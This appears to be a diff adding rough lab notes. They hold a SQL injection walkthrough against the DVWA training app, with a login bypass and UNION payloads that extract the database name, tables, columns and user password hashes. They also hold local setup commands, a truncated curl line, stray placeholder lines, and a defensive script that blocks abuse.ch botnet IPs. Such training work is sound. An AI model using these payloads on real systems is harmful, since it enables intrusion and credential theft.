@@ -1,3 +1,71 @@
+Enter: 
+1' OR '1'='1 
+ Result:All user records are displayed 
+Confirms SQL Injection vulnerability 
+6. SQL Injection – Database Enumeration 
+Step 9: Find Number of Columns 
+1' ORDER BY 1-- - 
+1' ORDER BY 2-- - 
+1' ORDER BY 3-- - 
+Stop when error occurs    Last successful number = total columns 
+Step 10: UNION-Based Injection 
+1' UNION SELECT 1,2-- - 
+Step 11: Extract Database Name 
+1' UNION SELECT database(),2-- - 
+Step 12: Extract Table Names 
+1' UNION SELECT table_name,2  
+FROM information_schema.tables  
+WHERE table_schema=database()-- - 
+Step 13: Extract Column Names 
+1' UNION SELECT column_name,2  
+FROM information_schema.columns  
+WHERE table_name='users'-- - 
+ 
+Step 14: Extract Username & Password 
+1' UNION SELECT user,password FROM users-- - 
+ Passwords may appear as hashes. 
+
+
+docker run --rm -it -p 127.0.0.1:8080:80 vulnerables/web-dvwa
+
+python3 -m http.server 8080
+sudo tcpdump -i any -w capture.pcap port 8080
+curl -X POST -d "" http
+
+# firewall.py
+
+import requests, csv, subprocess 
+
+# source: Abuse CH 
+response = requests.get(
+"https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
+).text 
+
+rule = 'netsh advfirewall firewall delete rule name="BadIP"' 
+subprocess.run(["PowerShell", "-Command", rule]) 
+
+mycsv = csv.reader(
+    filter(lambda x: not x.startswith("#"), response.splitlines()) 
+) 
+
+for row in mycsv: 
+    ip = row[1] 
+    if ip != "dst_ip": 
+        print("Added Rule to block:", ip) 
+        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip 
+        subprocess.run(["PowerShell", "-Command", rule])
+
+
+
+
+
+
+
+
+
+
+
+
 hiii
 ccc
 daaaa
